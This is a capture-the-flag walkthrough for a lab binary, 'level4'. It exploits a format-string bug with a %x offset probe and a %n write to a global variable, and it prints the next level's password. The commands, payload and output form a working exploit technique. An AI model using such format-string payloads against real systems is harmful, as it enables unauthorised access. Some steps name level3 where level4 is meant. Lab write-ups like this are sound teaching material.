# Level 4 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level4@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 level3 users 5138 Mar  6  2016 level4
	```

3. **Test the binary**

	```bash
	./level4
	```

	It waits for input, echoes the input, and exits..


4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level4@<vm-ip>:/home/user/level4/level4 .
	```

	Disassemble using Ghidra.

5. **Find the correct stack offset for our input**

	We send a sequence of `%x` format specifiers until we see our `AAAA` in hex:

	```bash
	echo "AAAA %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
	```

	Output:

	```
	AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141
	```

	Here, `41414141` (AAAA) appears at position **12**.

6. **Check binary in GDB for variables**

	```bash
	gdb level3
	(gdb) info variables m
	```

	Output:

	```
	0x08049810  m
	```

	This means `m` is a global variable at address in little-endian format: `\x10\x98\x04\x08`

7. **Build and execute the payload**

	```bash
	(printf '\x10\x98\x04\x08'; echo '%16930112d%12$n') | ./level4
	```

	Output:

	```
	...
	-1208015184
	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
	```

	The first line is some integer printed by the program, the second line is the password for `level5`.
